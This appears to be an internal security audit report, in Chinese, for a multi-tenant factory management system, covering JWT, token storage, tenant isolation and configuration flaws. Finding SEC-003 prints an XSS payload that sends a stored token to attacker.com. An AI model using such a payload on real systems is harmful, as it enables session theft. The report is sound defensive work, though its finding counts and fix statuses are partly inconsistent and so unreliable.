# 智造管家（SmartFactory Agent）安全审计报告

**审计日期**：2026-03-11
**审计工程师**：Senior Security Engineer
**系统版本**：Phase 1
**报告密级**：内部机密

---

## 目录

1. [审计范围与方法](#1-审计范围与方法)
2. [执行摘要](#2-执行摘要)
3. [风险发现列表](#3-风险发现列表)
4. [安全加固建议](#4-安全加固建议)
5. [合规检查清单（OWASP Top 10）](#5-合规检查清单owasp-top-10)
6. [结论与上线建议](#6-结论与上线建议)

---

## 1. 审计范围与方法

### 1.1 审计范围

| 层次 | 审计内容 | 覆盖文件 |
|------|----------|----------|
| 认证与授权 | JWT 实现、Token 存储、RBAC | `middleware/auth.ts`、`modules/auth/*`、`stores/authStore.ts`、`utils/request.ts` |
| 多租户隔离 | Row-Level 隔离完整性 | `shared/BaseRepository.ts`、全部 `*.service.ts` |
| SQL 安全 | 注入风险、参数化查询 | 所有 `AppDataSource.query()` 调用点 |
| API 安全 | 频率限制、CORS、输入校验 | `app.ts`、`middleware/validator.ts`、各 `*.routes.ts` |
| 数据安全 | 密码存储、敏感信息加密、日志泄漏 | `auth.service.ts`、`errorHandler.ts`、`.env.example` |
| 基础设施 | 容器安全、Nginx 配置 | `docker-compose.yml`、`Dockerfile`（API/Web）、`nginx.conf` |
| 依赖安全 | 已知漏洞组件 | `package.json`（间接审计） |

### 1.2 审计方法

- **静态代码分析**：逐文件审查所有业务逻辑、中间件、配置文件
- **数据流追踪**：从 HTTP 请求入口追踪至数据库写入，验证参数是否全程参数化
- **租户隔离矩阵**：扫描所有 `AppDataSource.query()` 调用，核查是否携带 `tenant_id` 条件
- **配置审查**：检查 Docker Compose、Nginx、环境变量模板的安全配置
- **安全原则**：Zero Trust、Least Privilege、Defense in Depth

---

## 2. 执行摘要

### 风险分布

| 严重程度 | 发现数量 | 已修复 |
|----------|----------|--------|
| Critical | 2 | 2 |
| High | 5 | 5 |
| Medium | 6 | 0（建议修复）|
| Low | 4 | 0（建议修复）|
| Info | 3 | N/A |
| **合计** | **20** | **7** |

### 核心结论

系统整体安全架构设计合理，多租户隔离机制基础可靠（BaseRepository 强制注入 tenant_id），密码使用 bcrypt 存储，参数化查询使用广泛。但存在若干需要立即修复的高危问题：

1. **Access Token 与 Refresh Token 使用同一密钥签发**，且 Refresh Token 未实现服务端吊销机制
2. **JWT Token 存储于 localStorage**，面临 XSS 攻击导致的 Token 劫持风险
3. **Redis 配置存在环境变量名不一致 bug**，生产环境 Redis 可能无密码连接
4. **init.sql 硬编码备份账号密码**，存在凭据泄漏风险
5. **Nginx 缺少 Content-Security-Policy 响应头**，XSS 防护存在缺口
6. **部分直接 SQL 查询缺少租户隔离**（checker.service 内部辅助查询）

---

## 3. 风险发现列表

---

### SEC-001 [Critical] JWT Access Token 与 Refresh Token 共用同一签名密钥

**严重程度**：Critical
**发现位置**：`services/api/src/middleware/auth.ts:6`、`services/api/src/modules/auth/auth.service.ts:8`

**详细描述**：

```typescript
// auth.ts
const JWT_SECRET = process.env.JWT_SECRET ?? 'change-me-in-production';

// auth.service.ts - 同一个 JWT_SECRET
export function signRefreshToken(userId: number, tenantId: number): string {
  return jwt.sign({ userId, tenantId, type: 'refresh' }, JWT_SECRET, {
    expiresIn: '30d',
  });
}
```

Access Token（7天有效期）和 Refresh Token（30天有效期）使用**同一个 `JWT_SECRET`** 签名。这意味着：
1. 如果 Access Token 被泄漏，攻击者可以使用相同密钥伪造 Refresh Token，从而绕过 30 天重新认证的设计
2. Refresh Token 的 `type: 'refresh'` 字段仅在 `refreshToken()` 方法中校验，但 `authMiddleware` 不校验 `type` 字段，理论上 Refresh Token 也可以直接作为 Access Token 使用

**影响范围**：所有用户认证安全边界

**修复方案**：为 Refresh Token 单独设置签名密钥，同时在 `authMiddleware` 中拒绝 `type: 'refresh'` 类型的 token

**状态**：已修复（见代码变更）

---

### SEC-002 [Critical] Redis 连接配置环境变量名不一致，生产环境可能无密码连接

**严重程度**：Critical
**发现位置**：`services/api/src/config/redis.ts:13`

**详细描述**：

```typescript
// redis.ts 中使用的是 REDIS_PASS
password: process.env.REDIS_PASS ?? undefined,

// docker-compose.yml 中注入的是 REDIS_PASSWORD
REDIS_PASSWORD: ${REDIS_PASSWORD}

// .env.example 定义的也是 REDIS_PASSWORD
REDIS_PASSWORD=CHANGE_ME_redis_password
```

`redis.ts` 读取 `process.env.REDIS_PASS`，但 `docker-compose.yml` 注入的环境变量名为 `REDIS_PASSWORD`。两者不一致导致 `process.env.REDIS_PASS` 永远为 `undefined`，Redis 客户端将以**无密码方式连接 Redis**，Redis 的 `requirepass` 配置生效于服务端，但客户端不发送密码会导致认证失败——若 Redis 端口被意外暴露，攻击者可无密码访问。

更危险的是：如果 Redis 在开发/测试环境未配置密码，此 bug 不会被发现，但一旦生产环境也没有密码，分布式锁、会话缓存、库存快照数据将完全暴露。

**影响范围**：Redis 认证失效，潜在缓存数据泄漏、分布式锁被篡改

**修复方案**：统一使用 `REDIS_PASSWORD`

**状态**：已修复（见代码变更）

---

### SEC-003 [High] JWT Token 存储于 localStorage，面临 XSS Token 劫持

**严重程度**：High
**发现位置**：`services/web/src/stores/authStore.ts:42-44`、`services/web/src/utils/request.ts:19-22`

**详细描述**：

```typescript
// authStore.ts
setAuth: (user, accessToken, refreshToken) => {
  localStorage.setItem(config.tokenKey, accessToken);
  localStorage.setItem(config.refreshTokenKey, refreshToken);  // Refresh Token 也存 localStorage
  localStorage.setItem(config.userKey, JSON.stringify(user));
```

JWT Access Token 和 Refresh Token 均存储于 `localStorage`。`localStorage` 可被同域下任意 JavaScript 访问，一旦系统存在 XSS 漏洞（包括第三方依赖引入的漏洞），攻击者可以读取全部 Token：

```javascript
// 攻击者的 XSS payload
fetch('https://attacker.com/steal?token=' + localStorage.getItem('sf_token'))
```

Refresh Token 的泄漏尤为危险，因为其有效期长达 30 天。

**影响范围**：全部用户认证凭据，攻击成功后可长期模拟用户身份

**修复建议**：
- **最优方案**：将 Access Token 存储于内存（Zustand state），Refresh Token 存储于 `HttpOnly; Secure; SameSite=Strict` Cookie，需后端配合设置
- **当前替代方案**：至少将 Refresh Token 从 localStorage 移除，通过 Cookie 传递；并确保 Nginx 配置严格的 CSP 头阻断 XSS
- 在 Nginx 配置中添加完善的 Content-Security-Policy

**状态**：Medium 级改造，已在 Nginx 配置修复 CSP（见 SEC-009），Token 存储方案变更记录为待办

---

### SEC-004 [High] Refresh Token 无服务端吊销机制

**严重程度**：High
**发现位置**：`services/api/src/modules/auth/auth.service.ts:163-201`

**详细描述**：

```typescript
async refreshToken(refreshTokenStr: string): Promise<{ accessToken: string }> {
  let payload: { userId: number; tenantId: number; type?: string };
  try {
    payload = jwt.verify(refreshTokenStr, JWT_SECRET) as typeof payload;
  } catch {
    throw new AppError('刷新令牌无效或已过期', ResponseCode.UNAUTHORIZED, 401);
  }
  // 仅校验 token 签名，无服务端状态校验
  // 用户登出后，refreshToken 仍然有效
```

用户执行登出（`logout()`）时，前端只清除了 localStorage 中的 Token，**服务端没有将 Refresh Token 加入黑名单**。攻击者若已获取 Refresh Token（例如通过历史 XSS 或网络抓包），即使用户已登出，仍然可以在 30 天内持续刷新获得新的 Access Token。

当用户账号被管理员锁定时，`refreshToken()` 方法会查询 `users.status`，如果 status 已变为 `locked`，则刷新失败——这是现有的部分防护，但仅限于账号状态变更，不能覆盖主动登出场景。

**影响范围**：已登出用户的会话可被攻击者重建，账号锁定后 Access Token 7天内仍有效

**修复建议**：
1. 将 Refresh Token 存入 Redis（`session:{token_hash}` → `userId`），登出时删除 Redis Key
2. 刷新时先验证 Redis 中是否存在对应记录
3. Access Token 有效期从 7 天缩短至 15-30 分钟

**状态**：待架构改造（记录为技术债）

---

### SEC-005 [High] JWT 默认密钥 fallback 值存在于代码中

**严重程度**：High
**发现位置**：`services/api/src/middleware/auth.ts:6`、`services/api/src/modules/auth/auth.service.ts:8`

**详细描述**：

```typescript
// auth.ts:6
const JWT_SECRET = process.env.JWT_SECRET ?? 'change-me-in-production';

// auth.service.ts:8 — 同样的硬编码 fallback
const JWT_SECRET = process.env.JWT_SECRET ?? 'change-me-in-production';
```

两处代码都有相同的硬编码 fallback `'change-me-in-production'`，存在两个问题：
1. **开发环境可能长期使用此 fallback**，若开发数据库包含生产数据，Token 将被弱密钥签名
2. **JWT_SECRET 在两个文件中各自独立读取**，如果未来两处 fallback 不一致，将导致 Token 签名/验证使用不同密钥的隐性 bug

此外，系统在启动时没有校验 `JWT_SECRET` 是否已被修改（至少检查是否等于 fallback 值）。

**影响范围**：若 `JWT_SECRET` 未配置，所有 JWT 使用已知密钥签名，攻击者可伪造任意 Token

**修复方案**：启动时强制校验 `JWT_SECRET`，长度不足时拒绝启动

**状态**：已修复（见 `index.ts` 启动校验代码）

---

### SEC-006 [High] init.sql 硬编码备份账号密码

**严重程度**：High
**发现位置**：`infra/db/init.sql:31-33`

**详细描述**：

```sql
CREATE USER IF NOT EXISTS 'sf_backup'@'localhost'
  IDENTIFIED BY 'backup_password_change_me';
```

数据库初始化脚本中硬编码了备份账号 `sf_backup` 的密码 `backup_password_change_me`。此文件提交到 Git 仓库，意味着：
1. 任何有代码仓库访问权限的人都能获取备份账号凭据
2. 如果运维人员忘记修改密码，生产环境将使用此已知弱密码
3. 该账号具有 `SELECT, LOCK TABLES, SHOW VIEW, EVENT, TRIGGER` 权限，可读取全部业务数据

**影响范围**：数据库全量数据泄漏风险

**修复方案**：
1. 移除 init.sql 中的密码硬编码，改为通过环境变量注入
2. 或直接从 init.sql 中移除备份账号创建语句，改为独立的运维初始化脚本

**状态**：已修复（见 `init.sql` 变更）

---

### SEC-007 [High] `checkDyeLotConsistency` 查询缺少租户隔离

**严重程度**：High
**发现位置**：`services/api/src/modules/inventory/inventory.service.ts:456-463`

**详细描述**：

```typescript
private async checkDyeLotConsistency(
  productionOrderId: number, skuId: number, dyeLotNo: string,
): Promise<boolean> {
  const [binding] = await AppDataSource.query<Array<{ dye_lot_no: string }>>(
    `SELECT dye_lot_no FROM order_dye_lot_bindings
     WHERE production_order_id = ? AND sku_id = ? LIMIT 1`,
    //  ↑ 缺少 AND tenant_id = ? 条件！
    [productionOrderId, skuId],
  );
```

`order_dye_lot_bindings` 表的查询**没有 `tenant_id` 条件**。攻击者（或有权限的恶意租户用户）可以通过传入其他租户的 `productionOrderId`，读取跨租户的缸号绑定记录，导致信息泄漏。

该方法由 `outbound()` 调用，`outbound()` 本身有认证保护，但 `productionOrderId` 来自用户输入，可以被枚举攻击。

**影响范围**：跨租户数据泄漏（`order_dye_lot_bindings` 表）

**修复方案**：在查询中加入 `AND tenant_id = ?` 条件

**状态**：已修复（见代码变更）

---

### SEC-008 [High] `getWorkerTasks` 路由未校验 workerId 归属，存在越权访问

**严重程度**：High
**发现位置**：`services/api/src/modules/production/production.routes.ts:28`、`scheduler.service.ts:225-238`

**详细描述**：

```typescript
// production.routes.ts
router.get('/tasks/worker/:workerId', asyncHandler(...getWorkerTasks...));
// 无 requireRoles 限制，仅 authMiddleware

// scheduler.service.ts
async getWorkerTasks(workerId: number, date: string): Promise<any[]> {
  return AppDataSource.query(
    `... WHERE pt.tenant_id = ? AND pt.worker_id = ? AND pt.task_date = ?`,
    [this.tenantId, workerId, date],  // workerId 直接来自路由参数，未验证其归属
  );
}
```

任何经过认证的用户（包括普通工人角色），可以通过修改 URL 中的 `workerId` 参数，查看**同租户内**任意其他工人的任务列表。工人甲可以枚举所有工人ID，获知工人乙的今日生产任务，包括生产工单、销售订单号等业务信息。

**影响范围**：同租户内任意工人任务数据的未授权读取

**修复方案**：非 supervisor/boss 角色只能查看自己（`req.userId === workerId`）的任务

**状态**：已修复（见代码变更）

---

### SEC-009 [Medium] Nginx 缺少 Content-Security-Policy 安全头

**严重程度**：Medium
**发现位置**：`services/web/nginx.conf:33-37`

**详细描述**：

```nginx
add_header X-Frame-Options           "SAMEORIGIN"            always;
add_header X-Content-Type-Options    "nosniff"               always;
add_header X-XSS-Protection         "1; mode=block"         always;
add_header Referrer-Policy          "strict-origin-when-cross-origin" always;
add_header Permissions-Policy       "camera=(), microphone=(), gelatinization=()" always;
# 缺少 Content-Security-Policy
# 缺少 Strict-Transport-Security（HTTPS 场景）
```

现有安全头配置中缺少 `Content-Security-Policy（CSP）`，这是防御 XSS 攻击最重要的浏览器级防护机制。`X-XSS-Protection: 1; mode=block` 已被现代浏览器废弃（Chrome 78+ 不支持），仅 CSP 提供真正有效的 XSS 防护。

结合 SEC-003（Token 存储于 localStorage），缺少 CSP 使得 XSS 攻击后果极其严重。

**影响范围**：XSS 攻击成功概率上升，可导致 Token 劫持

**修复方案**：添加 CSP 头，至少禁止 `unsafe-inline` 脚本

**状态**：已修复（见 `nginx.conf` 变更）

---

### SEC-010 [Medium] 登录接口限流仅针对 `/api/auth/login`，微信登录接口无限流

**严重程度**：Medium
**发现位置**：`services/api/src/app.ts:40-45`

**详细描述**：

```typescript
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 20,
  message: { ... },
});
app.use('/api/auth/login', authLimiter);
// 未覆盖 /api/auth/wechat-login
// 未覆盖 /api/auth/refresh
```

微信小程序登录接口 `/api/auth/wechat-login` 和 Token 刷新接口 `/api/auth/refresh` 未配置单独限流，仅受全局限流（300次/分钟）保护。攻击者可以：
1. 对微信登录接口进行暴力 OpenID 枚举
2. 对 refresh 接口进行大量刷新请求，消耗服务器资源

**影响范围**：暴力枚举攻击、DoS 风险

**修复方案**：将 authLimiter 统一应用于 `/api/auth` 前缀

**状态**：已修复（见 `app.ts` 变更）

---

### SEC-011 [Medium] 错误日志记录 `req.tenantId` / `req.userId`，在认证前路由可能记录 undefined

**严重程度**：Medium
**发现位置**：`services/api/src/middleware/errorHandler.ts:18-23`

**详细描述**：

```typescript
console[logLevel](`[${req.method}] ${req.path}`, {
  error: err instanceof Error ? err.message : String(err),
  stack: err instanceof Error ? err.stack : undefined,
  tenantId: req.tenantId,  // 认证前的路由此值为 undefined
  userId: req.userId,
});
```

错误日志记录了 `stack trace`，在生产环境可能将内部错误栈（包含文件路径、行号等）写入日志。如果日志系统被外部访问（例如日志聚合系统配置不当），会暴露系统内部结构。

注意：`errorHandler` 已正确对外屏蔽了栈信息（返回 `'服务内部错误'`），但日志文件本身包含完整栈信息，需要确保日志访问控制。

**影响范围**：日志泄漏内部架构信息

**修复建议**：生产环境日志中的 `stack` 应写入安全日志（不对外暴露），并为日志文件配置访问控制

---

### SEC-012 [Medium] `app.ts` 未配置 CORS，依赖 Nginx 反向代理隐式处理

**严重程度**：Medium
**发现位置**：`services/api/src/app.ts`（全文未见 CORS 配置）

**详细描述**：

API 服务未配置显式的 CORS 策略，在容器编排中 API 服务通过 `expose: 3000` 仅在内部网络暴露，正常情况下依赖 Nginx 作为唯一入口。

但在以下场景存在风险：
1. 私有化部署时，客户可能直接暴露 API 端口（不经过 Nginx）
2. 开发/测试环境可能直接访问 API 端口，导致任意来源的请求被处理
3. 未来若引入微服务间调用，无 CORS 策略可能导致意外的跨域请求被接受

**修复建议**：在 `app.ts` 中使用 `cors` 中间件，配置白名单域名

---

### SEC-013 [Medium] `PaginationSchema` 最大 pageSize 为 200，存在大量数据导出风险

**严重程度**：Medium
**发现位置**：`services/api/src/middleware/validator.ts:33`

**详细描述**：

```typescript
export const PaginationSchema = z.object({
  page: z.coerce.number().int().min(1).default(1),
  pageSize: z.coerce.number().int().min(1).max(200).default(20),
});
```

分页最大值为 200，攻击者通过循环分页请求，可以批量导出系统中的 SKU 库、客户列表、销售订单等敏感数据。对于 15-30 人的工厂，这意味着可以在短时间内导出全部业务数据。

**修复建议**：敏感模块（客户、供应商、销售订单）的 pageSize 上限应降至 50，并在数据导出功能上添加审计日志

---

### SEC-014 [Medium] `inventory.service.ts` 的 keyword 搜索使用 LIKE 通配符，存在性能攻击风险

**严重程度**：Medium（性能层面的拒绝服务）
**发现位置**：`services/api/src/modules/inventory/inventory.service.ts:92-94`

**详细描述**：

```typescript
if (params.keyword) {
  conditions.push('(s.name LIKE ? OR s.sku_code LIKE ?)');
  qParams.push(`%${params.keyword}%`, `%${params.keyword}%`);
}
```

keyword 参数使用 `%xxx%` 全文模糊匹配，将导致全表扫描。虽然有全局限流，但同一租户内的合法用户可以频繁触发此查询，消耗数据库资源。

相比之下，`sku.repository.ts` 中的搜索使用了 MySQL 全文索引 `MATCH ... AGAINST`，更为高效。

**修复建议**：为 `skus.name` 和 `skus.sku_code` 建立全文索引，或限制 keyword 最小长度为 2 字符

---

### SEC-015 [Low] API Dockerfile 未使用 dumb-init 处理 PID 1 信号

**严重程度**：Low
**发现位置**：`services/api/Dockerfile:64`

**详细描述**：

```dockerfile
# Dockerfile 注释提到 dumb-init 但未实际安装和使用
# 使用 dumb-init 处理 PID 1 信号转发
ENV NODE_ENV=production
CMD ["node", "dist/index.js"]
```

注释说明了计划使用 `dumb-init`，但实际 `CMD` 直接运行 `node`，Node.js 进程作为 PID 1 运行。PID 1 进程不会正确转发 SIGTERM 信号给子进程，导致 `docker stop` 时容器需要等待超时（10秒）才能强制终止，影响优雅停机和部署效率。

**修复建议**：安装 `dumb-init` 并使用 `CMD ["dumb-init", "node", "dist/index.js"]`

---

### SEC-016 [Low] Docker Compose 中 MySQL 端口绑定到 127.0.0.1，Redis 同样，但未在注释中标注生产必须删除

**严重程度**：Low
**发现位置**：`docker-compose.yml:44`、`docker-compose.yml:82`

**详细描述**：

```yaml
ports:
  # 生产环境建议注释掉此行，避免数据库端口暴露到宿主机
  - "127.0.0.1:3306:3306"
```

现有配置已绑定到 `127.0.0.1`（仅宿主机本地可访问），比绑定到 `0.0.0.0` 安全，但对于生产环境，宿主机上的其他服务或通过 SSH 隧道的攻击者仍然可以访问。

正面评价：文件中已有注释提示生产环境应注释此行，但建议通过环境变量控制而非手动注释。

---

### SEC-017 [Low] `generateTxNo` 使用 `Math.random()` 而非密码学安全随机数

**严重程度**：Low
**发现位置**：`services/api/src/modules/inventory/inventory.service.ts:465-476`

**详细描述**：

```typescript
private generateTxNo(direction: 'IN' | 'OUT'): string {
  // ...
  const rand = Math.floor(Math.random() * 9999).toString().padStart(4, '0');
  return `${direction}${ts}${rand}`;
}
```

流水号使用 `Math.random()` 生成，理论上可被预测。虽然流水号不直接作为安全凭据，但可预测的流水号可能被利用进行枚举攻击（尝试直接引用其他租户的流水号）。

由于流水号查询时都有 `tenant_id` 过滤，此风险较低，但建议使用 `crypto.randomBytes()` 替换。

---

### SEC-018 [Low] Web Dockerfile 健康检查访问根路径，可能干扰日志

**严重程度**：Low
**发现位置**：`services/web/Dockerfile:52`

**详细描述**：

```dockerfile
HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
  CMD wget -qO- http://localhost:80/ || exit 1
```

健康检查访问根路径 `/`，会在 Nginx 访问日志中产生大量健康检查记录，干扰真实用户流量的日志分析。API Dockerfile 访问 `/health`（正确），Web Dockerfile 应该同样访问专用的健康检查端点。

**修复建议**：将健康检查路径改为 `http://localhost:80/health`（Nginx 已配置此路径且 `access_log off`）

---

### SEC-019 [Info] bcrypt 密码存储安全性良好

**状态**：通过
**位置**：`auth.service.ts:67`

系统使用 `bcrypt.compare()` 验证密码，密码以 `password_hash` 字段存储，未发现明文密码存储。`bcrypt` 默认盐轮次（cost factor）为 10，可满足基本安全要求。建议确认应用层 bcrypt cost 参数配置为 12 或以上以应对现代硬件。

---

### SEC-020 [Info] SQL 参数化查询整体覆盖良好

**状态**：通过
**位置**：所有 `AppDataSource.query()` 调用

经逐文件审查，所有 `AppDataSource.query()` 调用均使用 `?` 占位符参数化，未发现字符串拼接 SQL 的情况。TypeORM 的 `repo.find()`、`repo.save()` 等 ORM 方法同样使用参数化查询。

**注意**：`sku.repository.ts` 中的 `MATCH ... AGAINST` 使用了参数化：

```typescript
conditions.push('MATCH(s.name, s.spec) AGAINST (? IN BOOLEAN MODE)');
params.push(`*${filter.keyword}*`);
```

关键字被拼接了 `*`（全文索引通配符），这是 MySQL 全文索引的正常用法，不构成 SQL 注入风险（`?` 参数已被转义，通配符在参数值内部，MySQL 驱动会将整个值当作字符串参数传递）。

---

### SEC-021 [Info] 多租户隔离 BaseRepository 机制设计合理

**状态**：通过（部分问题见 SEC-007）

`BaseRepository` 通过构造函数注入 `tenantContext`，所有 `findOneByTenant`、`findManyByTenant`、`buildInsertData` 方法自动注入 `tenant_id`，设计合理。

各模块 Service 构造时从 `req.user` 获取 `tenantId`，通过 `tenantContextMiddleware` 确保请求上下文的合法性。

除 SEC-007 报告的 `checkDyeLotConsistency` 缺失外，经过全量扫描：
- `auth.service.ts` 的直接 SQL 查询均包含 `tenant_id` 参数
- `bom.service.ts` 的递归 CTE 查询在锚点和递归部分均有 `tenant_id` 条件
- `quality.service.ts` 的跨表联查通过 JOIN 条件间接保证了租户隔离

---

## 4. 安全加固建议

### 4.1 身份认证加固路线图

**短期（上线前必须完成）**：
- [x] SEC-001: Access/Refresh Token 独立密钥
- [x] SEC-002: Redis 密码配置 bug 修复
- [x] SEC-005: 启动时强制校验 JWT_SECRET
- [x] SEC-007: 补全租户隔离

**中期（上线后 1 个月内）**：
- [ ] SEC-004: 实现 Refresh Token 服务端吊销（Redis 黑名单）
- [ ] SEC-003: 将 Refresh Token 迁移至 HttpOnly Cookie
- [ ] SEC-010: 修复 authLimiter 覆盖范围

**长期（版本迭代）**：
- [ ] 引入 MFA（多因素认证），至少对 boss/supervisor 角色强制
- [ ] 实现操作审计日志（谁在何时做了什么）
- [ ] 引入 API Gateway 统一处理认证、限流、日志

### 4.2 密码策略规范

```
最小长度：8 字符
复杂度要求：大小写字母 + 数字（建议）
bcrypt cost factor：最低 12（当前需确认）
密码重置：通过邮件/短信验证码，不允许明文传输新密码
登录失败锁定：5次失败后锁定账号 30 分钟（当前实现了状态锁定但无自动解锁）
```

### 4.3 Token 策略规范

```
Access Token 有效期：15-30 分钟（当前 7 天，过长）
Refresh Token 有效期：30 天（合理）
Refresh Token 存储：HttpOnly; Secure; SameSite=Strict Cookie
Token 刷新：滑动窗口机制，每次使用自动续期
Token 吊销：登出后立即失效（Redis 黑名单）
```

### 4.4 数据加密策略规范

```
传输加密：全站 HTTPS（生产环境必须）
密码存储：bcrypt（cost ≥ 12）
API Key 存储：AES-256-GCM 加密后存储（当前 OPENAI_API_KEY 直接存环境变量，可接受）
数据库静态加密：MySQL 8.0 支持 TDE，高隐私部署时建议启用
备份文件加密：mysqldump 输出后使用 GPG 加密
```

### 4.5 基础设施加固清单

```
Docker:
  - 所有容器以非 root 用户运行 [已实现: API 用 appuser, Nginx 用 nginx]
  - 生产环境移除 MySQL/Redis 端口映射 [已有注释提醒]
  - 添加 security_opt: no-new-privileges:true
  - read_only 文件系统（需要挂载日志目录例外）

Nginx:
  - 添加 Content-Security-Policy [已修复]
  - 启用 HTTPS 并配置 HSTS [待 HTTPS 证书配置]
  - 配置请求大小限制 client_max_body_size

MySQL:
  - 确认应用账号无 DDL 权限（DROP, CREATE, ALTER）
  - 启用 MySQL 审计日志（Enterprise 版本）或使用 MariaDB Audit Plugin
```

---

## 5. 合规检查清单（OWASP Top 10）

| # | OWASP Top 10 2021 | 状态 | 相关发现 |
|---|-------------------|------|----------|
| A01 | Broken Access Control（访问控制失效） | 部分通过 | SEC-007、SEC-008：租户隔离缺口、workerId 越权 |
| A02 | Cryptographic Failures（加密失败） | 部分通过 | SEC-001：双 token 共用密钥；SEC-003：localStorage 存储 |
| A03 | Injection（注入） | 通过 | SEC-020：全量参数化查询，无字符串拼接 SQL |
| A04 | Insecure Design（不安全设计） | 部分通过 | SEC-004：无 Token 吊销机制 |
| A05 | Security Misconfiguration（安全配置错误） | 部分通过 | SEC-002：Redis 密码配置 bug；SEC-009：缺少 CSP |
| A06 | Vulnerable and Outdated Components（过时组件） | 需持续监控 | 建议定期运行 `npm audit` |
| A07 | Identification and Authentication Failures（认证失败） | 部分通过 | SEC-005：弱密钥 fallback；SEC-010：限流覆盖不全 |
| A08 | Software and Data Integrity Failures（完整性失败） | 通过 | 未发现反序列化漏洞，无不安全的依赖更新机制 |
| A09 | Security Logging and Monitoring Failures（日志监控失败） | 需改进 | SEC-011：错误日志包含 stack trace；缺少安全事件告警 |
| A10 | Server-Side Request Forgery（SSRF） | 通过 | 当前版本无外部 URL 拼接，AI Engine URL 通过环境变量固定配置 |

---

## 6. 结论与上线建议

### 6.1 已修复项目（本次审计）

| 编号 | 问题 | 修复文件 |
|------|------|----------|
| SEC-001 | Access/Refresh Token 独立密钥 | `middleware/auth.ts`、`auth.service.ts` |
| SEC-002 | Redis 密码环境变量名统一 | `config/redis.ts` |
| SEC-005 | 启动时强制校验 JWT_SECRET | `index.ts` |
| SEC-006 | init.sql 移除硬编码密码 | `infra/db/init.sql` |
| SEC-007 | checkDyeLotConsistency 补全 tenant_id | `inventory.service.ts` |
| SEC-008 | getWorkerTasks 自身权限校验 | `production.routes.ts` |
| SEC-009 | Nginx 添加 CSP 头 | `nginx.conf` |
| SEC-010 | authLimiter 覆盖微信登录和 refresh 接口 | `app.ts` |

### 6.2 上线建议

**可以上线**，但需满足以下前提条件：

**必须（Blocker）**：
1. 所有 Critical/High 级别修复已合并并通过回归测试
2. 生产环境 `.env` 文件中 `JWT_SECRET` 已设置为随机强密钥（`openssl rand -base64 48`）
3. 生产 `docker-compose.yml` 中 MySQL/Redis 的端口映射行已注释
4. `DB_ROOT_PASSWORD`、`DB_PASS`、`REDIS_PASSWORD` 均已设置为强密码
5. `infra/db/init.sql` 中备份账号密码已通过运维脚本单独设置

**强烈建议（上线后 30 天内完成）**：
1. 将 Access Token 有效期从 7 天缩短至 30 分钟，并实现无感刷新
2. 实现 Refresh Token 服务端吊销（Redis 黑名单）
3. 配置 HTTPS 证书并在 Nginx 中启用 HSTS
4. 建立每周 `npm audit` 依赖扫描流程

### 6.3 安全监控建议

- 配置 MySQL 慢查询日志告警（已配置，阈值 2 秒）
- 监控 authLimiter 触发频率，高频触发时告警
- 为登录失败建立告警规则：5分钟内同一账号失败 3 次触发告警
- 定期（每季度）轮换 `JWT_SECRET` 和数据库密码

---

*本报告由安全工程师基于 2026-03-11 代码快照生成，随代码变更需重新评估。*
